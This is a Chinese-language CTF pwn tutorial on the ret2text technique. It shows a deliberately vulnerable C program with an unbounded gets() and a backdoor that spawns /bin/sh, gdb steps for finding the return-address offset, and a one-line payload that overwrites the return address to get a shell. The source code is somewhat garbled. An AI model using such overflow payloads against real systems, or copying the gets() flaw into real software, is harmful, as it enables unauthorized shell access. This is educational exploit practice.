1.    题型介绍

pwn即溢出，需要掌握三门语言，C，汇编，python。
正式比赛一般是给一个端口和一个二进制文件，nc探测此端口会给出提示，要求输入内容，二进制文件执行后会给出一样的提示，要求输入内容。
可控内容一般是栈溢出点，也可能是堆溢出，甚至单纯计算一个数字(最后这种情况更加贴近misc)。通过栈溢出来获取远程端口的一个shell，通过这个shell来获取flag。
本地训练时，一般只要二进制文件或者C源码就行，目标是获取本地shell或者达成某个溢出结果比如打印success都行。
获取shell一般也有两种方式，一种是代码中内置后门函数，将其覆盖到返回地址，另一种则是shellcode。

2.    工具和命令

在kali最新版之上，还需要准备gdb，gdb-pwndbg插件，python2-pwntools库，python3-pwntools库，gcc-32位库，以及windows上的ida。

3.    简单题型之ret2text

网上名叫ret2text的pwn题非常多，细节有所不通但思路一致，都是一个gets溢出，一个后门函数。比如这题。

#include <stdio.h>#include <string.h>void success() {     puts("You Hava already controlled it.");    system("/bin/sh"); }void test() {    puts("Connection Successful.");} void vulnerable() {  char s[12];  gets(s);p  puts(s);  return;}int main(int argc, char **argv) {  vulnerable();  return 0;}

先编译为32位程序并查看属性和文件保护
gcc -m32 -z execstack ret2text.c


执行a.out并输入AAAAAAAAA，输入超长字符串时，程序发生崩溃，特征为segmentation fault

如果是参数形式可以用如下命令进行超长字符输入
./a.out `python -c 'print("A"*100)'`
这种交互形式就需要用这种命令
(python -c 'print "A"*100'; cat -) | ./a.out

由于有源码，我们知道其main()调用vulnerable()，vulnerable()调用gets()，在此处溢出到后门函数success，最终执行system("/bin/sh")
在没有源码的情况，可以用objdump查看汇编代码和函数，但拿到ida中分析更加清晰。

双击左边的函数名，F5反编译即可看到C代码。

如果程序较复杂，也可以shift+F12快速寻找/bin/sh或者其他的字符串来定位后门函数。



后门类pwn题，可简化为两步，寻找偏移量和确认后门函数地址，有的后门函数地址可直接在ida中看到，双击后门函数，看汇编代码即可。



但这里函数地址是不对的，具体是多少要在gdb中调试，也很简单，只需要函数名称即可
gdb a.out
starti
info address success


然后找偏移量，由于gets函数不限制传入字节大小，在栈中开辟给char s[12]的空间不够，而向上不断覆盖，最终目的是覆盖返回地址为后门函数地址。而存储着值的eax地址到返回地址的距离，也就是偏移量，又由于ebp始终挨着返回地址，也可以说ebp-eax+4就是偏移量。
具体在gdb中，给gets下一个断点，然后看栈帧就很容易明白，注意此处使用pwndbg插件。
disass vulnerable
b *0x56556239
r
n
AAAAAAAAA
Stack 50

可以看到eax为AAAAAAAAAAAA，因为不限制大小，可无限进行压栈，以影响其他地址的值。
此时，返回地址即为ebp的下一位0xffffd11c，其指向地址为0x5655626b，是main函数的+21位地址。意味着执行完vulnrable函数，返回到main函数中。
我们的目的就是覆盖掉0x5655626b，将其指向后门函数地址0x565561b9。
偏移量即为0xffffd11c-0xffffd104，结果再转换为10进制，gdb中可快速计算为24。


此为手动定位偏移量，在实际操作中，很多pwn相关工具都为我们提供了使用固定排序的字符串来自动定位偏移量。比如msf-pattern_create -l 100先生成字符串

同样为24，pwntools和peda均有类似功能可快速定位偏移量，不过这种方法有时候不太准确。

确定了偏移量和后门函数地址，即可编写payload，注意32位小端，需要将地址倒序。
(python -c 'print("A"*24 + "\x56\x55\x61\xb9"[::-1])' ; cat -) | ./a.out
